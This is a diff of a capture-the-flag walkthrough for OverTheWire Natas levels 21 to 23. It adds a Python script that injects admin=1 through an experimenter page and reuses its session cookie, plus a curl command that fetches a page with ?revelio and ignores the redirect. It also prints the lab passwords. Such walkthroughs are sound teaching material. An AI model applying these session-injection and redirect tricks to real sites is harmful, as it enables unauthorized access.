@@ -29,9 +29,25 @@ Level url: [http://natas21.natas.labs.overthewire.org/](http://natas21.natas.lab
 
 **Steps to Solve**
 1. Step 1 - In this level we have 2 sites and in the `experimental` we can do some trick to set `admin=1` because it doesn't check the input.
-2. Step 2 - Use my `python` code: [Python code](../code/natas/level_21_to_22.py)
+2. Step 2 - Use my `python` code:
+```python
+import requests
+auth = ("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")
 
-![Screenshot image](../screenshots/natas_level_21_to_22.png)
+experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/"
+payload = {"admin": "1", "submit": "Update", "debug": ""} 
+
+r1 = requests.get(experimenter_url, params=payload, auth=auth)
+phpsessid = r1.cookies['PHPSESSID']
+
+main_url = "http://natas21.natas.labs.overthewire.org/"
+r2 = requests.get(main_url, auth=auth, cookies={"PHPSESSID": phpsessid})
+
+print("\n[✅] Main page output:")
+print(r2.text)
+```
+
+![Screenshot image](/images/posts/natas_level_21_to_22.png)
 
 3. Step 3 - You can see we get the password in the response.
 4. Step 4 - Take the password to the next level.
@@ -69,7 +85,14 @@ if(array_key_exists("revelio", $_GET)) {
 ?>
 ```
 
-3. Step 3 - We can use `curl` command to do this. Take a look at the `bash` code I created: [Bash code](../code/natas/level_22_to_23.sh)
+3. Step 3 - We can use `curl` command to do this. Take a look at the `bash` code I created:
+```bash
+USER="natas22"
+PASS="d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz"
+URL="http://natas22.natas.labs.overthewire.org"
+
+curl -s -u $USER:$PASS -c - "$URL?revelio"
+```
 - Run it to get the password:
 
 ```bash
